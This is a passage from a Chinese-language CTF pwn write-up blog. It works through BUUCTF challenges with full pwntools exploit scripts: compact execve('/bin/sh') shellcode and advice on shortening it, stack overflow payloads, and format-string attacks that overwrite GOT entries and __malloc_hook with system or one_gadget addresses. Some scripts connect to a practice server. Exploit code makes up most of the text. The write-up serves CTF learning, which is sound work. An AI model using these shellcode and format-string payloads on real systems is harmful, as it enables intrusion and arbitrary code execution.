class="number">16</span>)</span><br><span class="line">sla(b<span class="string">&quot;initials?\n&quot;</span>, b<span class="string">&quot;3&quot;</span> * (<span class="number">3</span> + <span class="number">8</span>) + p64(stack_addr + <span class="number">0x28</span>) + <span class="keyword">asm</span>(shellcode3))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="rctf-2019-shellcoder"><a href="#rctf-2019-shellcoder" class="headerlink" title="rctf_2019_shellcoder"></a>rctf_2019_shellcoder</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#rctf_2019_shellcoder">BUUCTF在线评测</a></p>
<p>这个题目很不错，需要好好的分析题目意思，就是有点不太好理解，需要结合具体的上下文寄存器环境来写哈哈哈，xchg是个很不错的指令，用来交换值，当然也可以利用push pop,但会多一个bit</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">xchg rsi,rdi;</span></span><br><span class="line"><span class="string">mov dl,0xff;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line">sa(b<span class="string">&quot;hellcoder:&quot;</span>, <span class="keyword">asm</span>(shellcode))</span><br><span class="line">s(b<span class="string">&quot;a&quot;</span> * <span class="number">7</span> + <span class="keyword">asm</span>(shellcraft.sh()))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="xp0intctf-2018-bof"><a href="#xp0intctf-2018-bof" class="headerlink" title="xp0intctf_2018_bof"></a>xp0intctf_2018_bof</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#xp0intctf_2018_bof">BUUCTF在线评测</a></p>
<p>这个题目主要就是研究怎么缩短shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">bin_sh = convert_str_asmencode(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">shellcode = f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">xor esi,esi;</span></span><br><span class="line"><span class="string">mov rdx,&#123;bin_sh&#125;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">push rsi;</span></span><br><span class="line"><span class="string">pop rdx;</span></span><br><span class="line"><span class="string">push rsp;</span></span><br><span class="line"><span class="string">pop rdi;</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">bss_addr = <span class="number">0x404070</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004011B4</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401293</span></span><br><span class="line">sa(</span><br><span class="line">    b<span class="string">&quot;name: \n&quot;</span>,</span><br><span class="line">    <span class="keyword">asm</span>(shellcode),</span><br><span class="line">)</span><br><span class="line">sa(</span><br><span class="line">    b<span class="string">&quot;simple one.(*_*)\n&quot;</span>,</span><br><span class="line">    b<span class="string">&quot;a&quot;</span> * <span class="number">0x28</span> + p64(bss_addr),</span><br><span class="line">)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h4 id="缩短shellcode"><a href="#缩短shellcode" class="headerlink" title="缩短shellcode"></a>缩短shellcode</h4><p>这里的例子都以amd64为主<br>shellcode可以缩小的空间都在赋值上面，像syscall这些就没办法，包括我们需要把&#x2F;bin&#x2F;sh写进栈里面，一定会涉及一个mov rax,0x…. push 一下 那哪里可以节省呢?</p>
<h4 id="syscall里面rax赋值"><a href="#syscall里面rax赋值" class="headerlink" title="syscall里面rax赋值"></a>syscall里面rax赋值</h4><p>由于syscall的时候rax要变成一个只有al有值的数字，所以一般需要经过xor rax,rax mov al,0x3b 但这样需要xor rax,rax (3)+mov al,0x3b(2)&#x3D;&#x3D;5个字节 但还有一个更快的方法 push 0x3b(2) pop rax(1) pop寄存器,push寄存器的长度是最短的，所以我们可以充分利用pop,push来节省长度 来查看效果<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843073209-b621a783-524a-4561-8e92-f49dd917fcd3.png#averageHue=%2321201f&clientId=u9d5fd636-f51f-4&from=paste&id=u9ee20646&originHeight=198&originWidth=842&originalType=url&ratio=1&rotation=0&showTitle=false&size=29586&status=done&style=none&taskId=u04e3a9bd-d6c9-4392-9444-7135de2d9f1&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843073326-e022ad69-7e57-400b-8561-182b23a847a7.png#averageHue=%23262525&clientId=u9d5fd636-f51f-4&from=paste&id=u20fd5f71&originHeight=610&originWidth=739&originalType=url&ratio=1&rotation=0&showTitle=false&size=125169&status=done&style=none&taskId=u7d3205bd-63e8-43f8-b2ab-16fc5fbf826&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843073209-69163062-80c0-4a97-aef2-9dd536d2c6a2.png#averageHue=%23282624&clientId=u9d5fd636-f51f-4&from=paste&id=u88adb783&originHeight=43&originWidth=118&originalType=url&ratio=1&rotation=0&showTitle=false&size=2740&status=done&style=none&taskId=ub13be86d-6ef1-4b58-ac63-cb1612a158f&title=" alt="image.png"></p>
<h4 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h4><p>xor是很常见的指令，因为我们经常会涉及清0，比如说execve的syscall,rsi,rdx必须是0<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843073206-53226e72-456a-4409-b454-35d384ccd4c4.png#averageHue=%23262626&clientId=u9d5fd636-f51f-4&from=paste&id=u7c9954a9&originHeight=49&originWidth=335&originalType=url&ratio=1&rotation=0&showTitle=false&size=4757&status=done&style=none&taskId=u011cf619-ab89-45c4-8151-c7a7d3c040c&title=" alt="image.png"><br>xor r开头的都是3个长度，有时候我们可以调试通过上下文观察，如果可以的话使用xor e开头的就有e开头，xor指令最短也就是2个长度<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843073201-28de4174-f2a3-4317-b6d5-bc53533676da.png#averageHue=%23262626&clientId=u9d5fd636-f51f-4&from=paste&id=uccea456b&originHeight=63&originWidth=345&originalType=url&ratio=1&rotation=0&showTitle=false&size=5429&status=done&style=none&taskId=ubdd39d64-ead8-4e47-a23e-1a4a75353f2&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843074220-cd1b72c9-2e61-4418-a67f-a0e8710f59a0.png#averageHue=%23262626&clientId=u9d5fd636-f51f-4&from=paste&id=uc63edf05&originHeight=64&originWidth=406&originalType=url&ratio=1&rotation=0&showTitle=false&size=6055&status=done&style=none&taskId=u1cc4d1f4-2246-4510-b4dd-55c8e0daef8&title=" alt="image.png"><br>或者我们可以先把一个寄存器清零以后，然后再利用push pop指令，也是比较快的</p>
<h4 id="mov-rdi-rsp"><a href="#mov-rdi-rsp" class="headerlink" title="mov rdi,rsp"></a>mov rdi,rsp</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843074220-14d0c939-0e16-4c41-8670-986cfcc389f7.png#averageHue=%23252525&clientId=u9d5fd636-f51f-4&from=paste&id=ub7d619ab&originHeight=52&originWidth=355&originalType=url&ratio=1&rotation=0&showTitle=false&size=5514&status=done&style=none&taskId=u2e4c42e6-6cca-428c-ba8f-c892de1bb7a&title=" alt="image.png"><br>可以利用哦个pop rsp push rdi来缩短</p>
<h4 id="execve-bin-sh-最短的shellcode"><a href="#execve-bin-sh-最短的shellcode" class="headerlink" title="execve(&#x2F;bin&#x2F;sh)最短的shellcode"></a>execve(&#x2F;bin&#x2F;sh)最短的shellcode</h4><p>这里其实可以根据上下文环境，找到比如说rsi,rdx两个寄存器，哪个可以通过xor e开头的直接清零就放到第一句，不然这里就用xor rsi,rsi<br> xor rsi rsi #3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">debug()</span><br><span class="line">shellcode = asm(</span><br><span class="line">    &quot;xor rsi,rsi;push 0x6873;push rsp;pop rdi;push rsi;pop rdx;push 0x3b;pop rax;syscall&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">stack_addr = int(r(14), 16)</span><br><span class="line">payload = b&quot;a&quot; * 0x18 + p64(stack_addr + 0x20) + shellcode</span><br><span class="line">sl(payload)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<p>不知道为什么挂了</p>
<h3 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#starctf_2019_babyshell">BUUCTF在线评测</a></p>
<p>这个题比较简单，但就是要用\x00绕过</p>
<p>fuzz脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from itertools import *</span><br><span class="line">import re</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">1</span>, <span class="number">3</span>)</span>:</span><br><span class="line">    <span class="keyword">for</span> j in <span class="title function_">product</span><span class="params">([p8(k) <span class="keyword">for</span> k in range(<span class="number">256</span>)], repeat=i)</span>:</span><br><span class="line">        payload = b<span class="string">&quot;\x00&quot;</span> + b<span class="string">&quot;&quot;</span>.join(j)</span><br><span class="line">        res = disasm(payload)</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            res != <span class="string">&quot;        ...&quot;</span></span><br><span class="line">            and not re.search(r<span class="string">&quot;\[\w*?\]&quot;</span>, res)</span><br><span class="line">            and <span class="string">&quot;.byte&quot;</span> not in res</span><br><span class="line">        ):</span><br><span class="line">            print(res)</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sl(b<span class="string">&quot;\x00\xc0&quot;</span> + <span class="keyword">asm</span>(shellcraft.sh()))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a>lctf2016_pwn200</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#lctf2016_pwn200">BUUCTF在线评测</a></p>
<p>找到溢出点，覆盖为返回地址，然后修改返回地址为shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./pwn200_debug&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;debug&quot;</span> in elf_path:</span><br><span class="line">    libc_path = elf.linker.decode().replace(<span class="string">&quot;ld&quot;</span>, <span class="string">&quot;./libc&quot;</span>)</span><br><span class="line">    libc = ELF(libc_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc_path:</span><br><span class="line">        one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">    elif <span class="string">&quot;2.27&quot;</span> in libc_path:</span><br><span class="line">        one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        one_gadget = []</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc_path = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">29413</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> libc_path != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        io = process(elf_path, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: libc_path&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(elf_path)</span><br><span class="line">shellcode = <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;xor rdx,rdx;xor rsi,rsi;push rsi;mov rax, 0x68732f2f6e69622f;push rax;mov rdi,rsp;xor rax,rax;mov al,59;syscall&quot;</span></span><br><span class="line">)</span><br><span class="line">sa(b<span class="string">&quot;u?\n&quot;</span>, shellcode.ljust(<span class="number">47</span>, b<span class="string">&quot;a&quot;</span>) + b<span class="string">&quot;c&quot;</span>)</span><br><span class="line">ru(b<span class="string">&quot;c&quot;</span>)</span><br><span class="line">shellcode_addr = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - <span class="number">0x7FFF450E3CC0</span> + <span class="number">0x7FFF450E3C70</span></span><br><span class="line">ret_addr = shellcode_addr - <span class="number">0x7FFEEA8F0420</span> + <span class="number">0x7FFEEA8F03F8</span></span><br><span class="line"></span><br><span class="line">sa(b<span class="string">&quot;id ~~?\n&quot;</span>, b<span class="string">&quot;0000&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">sla(b<span class="string">&quot;money~\n&quot;</span>, p64(shellcode_addr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(ret_addr))</span><br><span class="line">sla(b<span class="string">&quot;choice : &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="bss上格式化字符串"><a href="#bss上格式化字符串" class="headerlink" title="bss上格式化字符串"></a>bss上格式化字符串</h2><h3 id="ciscn-2019-nw-6"><a href="#ciscn-2019-nw-6" class="headerlink" title="ciscn_2019_nw_6"></a>ciscn_2019_nw_6</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_nw_6">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>泄露libc,泄露栈地址，然后就可以利用调用链之间的ebp做文章</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">change_stack</span><span class="params">(stack_addr,dest_addr)</span>:</span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">4</span>)</span>:</span><br><span class="line">        <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;please input the key:\n&quot;</span>,f<span class="string">&quot;%&#123;stack_addr&amp;0xff&#125;c%4$hhn&quot;</span>)</span></span><br><span class="line">        <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;please input the key:\n&quot;</span>,f<span class="string">&quot;%&#123;dest_addr&amp;0xff&#125;c%8$hhn&quot;</span>)</span></span><br><span class="line">        stack_addr+=<span class="number">1</span></span><br><span class="line">        dest_addr=dest_addr&gt;&gt;<span class="number">8</span></span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;please input the key:\n&quot;</span>,b<span class="string">&quot;%17$p&quot;</span>)</span><br><span class="line">libc_base=<span class="type">int</span>(r(<span class="number">10</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]<span class="number">-241</span></span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;please input the key:\n&quot;</span>,b<span class="string">&quot;%4$p&quot;</span>)</span><br><span class="line">stack_addr=<span class="type">int</span>(r(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">main_stack_addr=stack_addr+<span class="number">0x14</span></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">change_stack(main_stack_addr,system_addr)</span><br><span class="line">canshu=main_stack_addr+<span class="number">8</span></span><br><span class="line">bin_sh_addr=libc_base+next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>))</span><br><span class="line">change_stack(canshu,bin_sh_addr)</span><br><span class="line">sla(b<span class="string">&quot;please input the key:\n&quot;</span>,f<span class="string">&quot;%&#123;(main_stack_addr-4)&amp;0xff&#125;c%4$hhn&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;please input the key:\n&quot;</span>,b<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="printf触发malloc"><a href="#printf触发malloc" class="headerlink" title="printf触发malloc"></a>printf触发malloc</h2><h3 id="cscctf-2019-final-babyprintf"><a href="#cscctf-2019-final-babyprintf" class="headerlink" title="cscctf_2019_final_babyprintf"></a>cscctf_2019_final_babyprintf</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#cscctf_2019_final_babyprintf">BUUCTF在线评测</a></p>
<p>这个题目是一个挺不错的题目，也是利用了malloc,但是用one)gaghtet打，因为在libc-2.27对size有了check</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sl(b<span class="string">&quot;%2$p&quot;</span>)</span><br><span class="line">libc_base = <span class="type">int</span>(rld(), <span class="number">16</span>) - <span class="number">0x7FE3B277A8D0</span> + <span class="number">0x7FE3B238D000</span></span><br><span class="line">malloc_hook_addr = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">one_gadget_addr = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">8</span>, &#123;malloc_hook_addr: one_gadget_addr&#125;)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sl(f<span class="string">&quot;%&#123;65536&#125;c&quot;</span>.encode())</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="0ctf2017-easiestprintf"><a href="#0ctf2017-easiestprintf" class="headerlink" title="0ctf2017_easiestprintf"></a>0ctf2017_easiestprintf</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#0ctf2017_easiestprintf">BUUCTF在线评测</a></p>
<p>这个题牛逼，需要看pritnf源码</p>
<p>printf会触发malloc</p>
<p>好题</p>
<p>牛逼</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line"><span class="meta"># shell = ssh(host=<span class="string">&quot;node4.buuoj.cn&quot;</span>, user=<span class="string">&quot;CTFMan&quot;</span>, port=26682, password=<span class="string">&quot;guest&quot;</span>)</span></span><br><span class="line"><span class="meta"># shell.process</span></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./EasiestPrintf&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">28439</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *0x804881C</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;read:\n&quot;</span>, str(elf.got[<span class="string">&quot;puts&quot;</span>]).encode())</span><br><span class="line">libc_base = <span class="type">int</span>(rld(), <span class="number">16</span>) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">malloc_hook_addr = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">sh_addr = <span class="number">0x0804A001</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">payload = (</span><br><span class="line">    fmtstr_payload(<span class="number">7</span>, &#123;malloc_hook_addr: system_addr, sh_addr: b<span class="string">&quot;sh\0&quot;</span>&#125;)</span><br><span class="line">    + f<span class="string">&quot;%&#123;0x0804A001-32&#125;c&quot;</span>.encode()</span><br><span class="line">)</span><br><span class="line">sla(b<span class="string">&quot;Good Bye\n&quot;</span>, payload)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="栈上的格式化字符串"><a href="#栈上的格式化字符串" class="headerlink" title="栈上的格式化字符串"></a>栈上的格式化字符串</h2><h3 id="watevr-2019-voting-machine-2"><a href="#watevr-2019-voting-machine-2" class="headerlink" title="watevr_2019_voting_machine_2"></a>watevr_2019_voting_machine_2</h3><p>比较简单的修改got</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sla(b&quot;Topic: &quot;,b&quot;aa&quot;+fmtstr_payload(8,&#123;elf.got[&quot;exit&quot;]:0x8420736&#125;,numbwritten=2))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h3 id="wustctf2020-babyfmt"><a href="#wustctf2020-babyfmt" class="headerlink" title="wustctf2020_babyfmt"></a>wustctf2020_babyfmt</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#wustctf2020_babyfmt">BUUCTF在线评测</a></p>
<p>其实题目不算复杂，主要可以通过修改一个类似于计数器的值实现两次printf,然后这个题的关键就是FILE结构</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843183861-80e3a8ab-a49d-47c0-adc5-e8d679c1bc2a.png#averageHue=%23fcfcfc&clientId=u9d5fd636-f51f-4&from=paste&height=191&id=ubd0cbe84&originHeight=239&originWidth=637&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33803&status=done&style=none&taskId=u9b999249-a1bd-4570-97fb-1236bb9d45c&title=&width=509.6" alt="image.png"></p>
<p>可以看到这里关闭了IO_stdout,所以需要我们提前把这个的fileno修改一下，就不会关闭</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 